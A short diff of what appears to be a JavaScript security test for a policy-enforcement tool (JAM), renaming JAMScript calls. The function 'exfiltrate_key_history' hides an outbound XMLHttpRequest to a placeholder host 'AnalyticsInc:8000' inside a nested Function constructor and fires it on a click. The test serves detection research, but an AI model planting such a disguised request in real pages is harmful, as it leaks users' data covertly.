@@ -1,11 +1,7 @@
 function exfiltrate_key_history() {
   var nest = 'return Function(\'xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest4", true);xmlhttp.send(null);\');';
-  var v3 = JAMScript.call(Function, null, [nest]);
-  var v0 = JAMScript.call(v3, null, []);
-  var v1 = xmlhttp = new XMLHttpRequest;
-  JAMScript.call(v0, null, [v1]);
+  JAM.call(JAM.call(Function, null, [nest])(), null, [xmlhttp = new XMLHttpRequest]);
   return
 }
-var v2 = document.getElementById("test");
-JAMScript.set(v2, "onclick", exfiltrate_key_history);
+JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history);
 
